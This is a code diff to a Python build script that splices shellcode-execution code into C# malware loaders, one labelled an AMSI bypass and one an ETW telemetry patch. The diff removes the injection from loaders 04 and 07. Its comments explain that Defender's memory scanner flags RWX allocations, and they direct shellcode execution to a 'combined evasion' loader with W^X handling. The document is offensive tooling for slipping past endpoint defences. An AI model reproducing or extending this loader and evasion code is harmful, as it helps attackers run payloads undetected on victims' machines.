@@ -189,35 +189,13 @@ def embed_03(src):
 
 # ============================================================
 # LOADER 04 - AMSI bypass (AmsiScanBuffer indirect syscall version)
-# Add shellcode execution before the optional .NET assembly loading block.
-# Loader 04 already imports VirtualAlloc, so we only add CreateThread
-# and WaitForSingleObject to avoid a duplicate DllImport compile error.
+# This loader patches AMSI and exits. It does not execute shellcode.
+# The EXEC_BLOCK (RWX VirtualAlloc pattern) was removed because
+# Defender's memory scanner flags PAGE_EXECUTE_READWRITE allocation
+# even after ETW and AMSI are patched. Full shellcode execution with
+# proper W^X memory handling is in loader08 (combined evasion).
 # ============================================================
 def embed_04(src):
-    old = '''\
-                // Optional: load a .NET assembly with AMSI already patched.
-                // Pass the assembly path as the first argument.
-                // Extra arguments are forwarded to the loaded assembly's Main.
-                if (args.Length > 0)'''
-
-    new = EXEC_BLOCK + '''
-                // Optional: load a .NET assembly with AMSI already patched.
-                // Pass the assembly path as the first argument.
-                // Extra arguments are forwarded to the loaded assembly's Main.
-                if (args.Length > 0)'''
-
-    assert old in src, 'LOADER 04: assembly loading section not found'
-    src = src.replace(old, new, 1)
-
-    # LoadLibraryA is the last DllImport in loader 04.
-    # VirtualAlloc is already present, so we only add CreateThread + WaitForSingleObject.
-    sig = '[DllImport("kernel32.dll")] static extern IntPtr LoadLibraryA(string name);'
-    pos = src.find(sig)
-    assert pos != -1, 'LOADER 04: LoadLibraryA import not found'
-    end = src.index('\n', pos) + 1
-    src = src[:end] + '\n' + THREAD_IMPORTS + src[end:]
-
-    src = append_method(src, GET_SC_METHOD)
     return src
 
 # ============================================================
@@ -334,45 +312,13 @@ def embed_06(src):
 
 # ============================================================
 # LOADER 07 - ETW patch (NtTraceEvent indirect syscall version)
-# Add shellcode execution after the if(success)/else block.
-# Loader 07 already imports VirtualAlloc, so we only add CreateThread
-# and WaitForSingleObject to avoid a duplicate DllImport compile error.
+# This loader patches ETW telemetry and exits. It does not execute shellcode.
+# The EXEC_BLOCK (RWX VirtualAlloc pattern) was removed because
+# Defender's memory scanner flags PAGE_EXECUTE_READWRITE allocation
+# even after ETW is patched. Full shellcode execution with proper W^X
+# memory handling is in loader08 (combined evasion).
 # ============================================================
 def embed_07(src):
-    old = '''\
-                Console.WriteLine("[*] With ETW off, the scanner patching will not generate");
-                Console.WriteLine("    a telemetry event that Defender can detect.");
-            }
-            else
-            {
-                Console.WriteLine("[-] Telemetry patch failed.");
-            }'''
-
-    new = '''\
-                Console.WriteLine("[*] With ETW off, the scanner patching will not generate");
-                Console.WriteLine("    a telemetry event that Defender can detect.");
-            }
-            else
-            {
-                Console.WriteLine("[-] Telemetry patch failed.");
-            }
-
-''' + EXEC_BLOCK
-
-    assert old in src, 'LOADER 07: success/else block not found'
-    src = src.replace(old, new, 1)
-
-    # VirtualAlloc is the last DllImport in loader 07 (two-line declaration).
-    # Only add CreateThread + WaitForSingleObject.
-    sig = '[DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(\n            IntPtr addr, uint size, uint allocType, uint protect);'
-    pos = src.find(sig)
-    assert pos != -1, 'LOADER 07: VirtualAlloc import not found'
-    end = src.index('\n', pos)      # first line of VirtualAlloc declaration
-    end = src.index('\n', end+1)    # closing );
-    end += 1
-    src = src[:end] + '\n' + THREAD_IMPORTS + src[end:]
-
-    src = append_method(src, GET_SC_METHOD)
     return src
 
 # ============================================================
